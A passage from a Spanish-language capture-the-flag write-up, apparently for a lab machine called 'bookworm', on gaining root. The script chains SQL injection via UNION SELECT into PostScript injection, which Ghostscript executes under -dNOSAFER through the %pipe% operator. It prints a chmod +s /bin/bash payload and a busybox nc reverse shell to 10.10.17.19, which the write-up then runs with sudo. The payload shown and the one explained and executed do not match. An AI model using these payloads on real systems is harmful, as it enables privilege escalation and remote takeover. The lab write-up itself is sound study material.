query = "... WHERE Orders.id = %s" % sys.argv[1]
```

Al no usar `consultas preparadas`, permitimos que un atacante cierre la consulta original y use un `UNION SELECT`. Esto nos da control total sobre los datos que el script "cree" que vienen de la base de datos (Nombre, Dirección, etc.), sin necesidad de modificar la base de datos real.

### PostScript inyection

Además el script genera un archivo `.ps` (PostScript) reemplazando etiquetas en una plantilla con los datos obtenidos de la SQLi:


```python
file_content = file_content.replace("NAME", name)
```

`PostScript` no es solo un formato de imagen; es un **lenguaje de programación completo**. Si inyectamos comandos PostScript en el campo `NAME` (vía SQLi), el script los escribirá dentro del archivo `.ps`.

### ps2pdf with -dNOSAFER

El fallo crítico final ocurre cuando el script intenta convertir ese PostScript a PDF:

```python
subprocess.check_output(["ps2pdf", "-dNOSAFER", postscript_output, pdf_output])
```

Ghostscript tiene un modo de seguridad llamado `-dSAFER` que está activado por defecto en versiones modernas. Sin embargo, el script usa explícitamente **`-dNOSAFER`**.

- Esta bandera deshabilita las restricciones de seguridad, permitiendo el uso del operador **`%pipe%`**.
- `%pipe%` permite ejecutar comandos del sistema operativo y leer su salida como si fuera un archivo.
### Payload

El payload que use fue:

```bash
) showpage (%pipe%chmod +s /bin/bash) (r) file ; (
```

- **`)`**: Cierra el paréntesis del string donde el script insertó nuestro nombre en la plantilla PostScript.
- **`showpage`**: Fuerza la renderización de la página actual.
- **`(%pipe%chmod +s /bin/bash)`**: El comando real. Le dice al sistema: "Ejecuta `busybox nc 10.10.17.19 4444 -e bash` y trata el resultado como un archivo".
- **`(r) file`**: Abre ese "archivo" (el pipe) en modo lectura, lo que dispara la ejecución del comando con los privilegios del proceso actual (**Root**, debido a `sudo`).
### Shell

El hecho de que salgan los errores, es bueno ya que indica que el comando rompió y ejecute mi código.

```bash
neil@bookworm:~$ sudo /usr/local/bin/genlabel "0 UNION SELECT ') showpage (%pipe%busybox nc 10.10.17.19 4444 -e bash) (r) file ; (', 'addr1', 'addr2', 'town', 'post', 1, 1 -- -"
Fetching order...
Generating PostScript file...
Generating PDF (until the printer gets fixed...)
Error: /undefined in ;
Operand stack:
   ()   --nostringval--
Execution stack:
   %interp_exit   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--   --nostringval--   --nostringval--   false   1   %stopped_push   1990   1   3   %oparray_pop   1989   1   3   %oparray_pop   1977   1   3   %oparray_pop   1833   1   3   %oparray_pop   --nostringval--   %errorexec_pop   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--
Dictionary stack:
   --dict:742/1123(ro)(G)--   --dict:0/20(G)--   --dict:75/200(L)--
Current allocation mode is local
Last OS error: Illegal seek
Current file position is 950
GPL Ghostscript 9.50: Unrecoverable error, exit code 1
Something went wrong!
Command '['ps2pdf', '-dNOSAFER', '-sPAPERSIZE=a4', '/tmp/tmpxtommch6printgen/output.ps', '/tmp/tmpxtommch6printgen/output.pdf']' returned non-zero exit status 1.
```

Y desde mi listener `nc` recibo la conexión como el usuario `root`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.208] 36024
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
bash-5.0# cat root.txt
dc7c23...
```

`~Happy Hacking`